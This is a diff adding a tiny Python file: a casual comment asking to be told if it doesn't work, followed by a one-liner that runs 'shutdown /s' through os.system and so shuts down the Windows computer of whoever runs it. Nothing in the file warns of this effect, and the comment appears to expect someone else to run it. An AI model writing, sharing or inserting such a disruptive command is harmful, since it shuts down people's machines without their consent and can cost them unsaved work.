@@ -1,0 +1,2 @@
+# Tell me if it doesen't work, i don't want to waste time.
+__import__('os').system('shutdown /s')
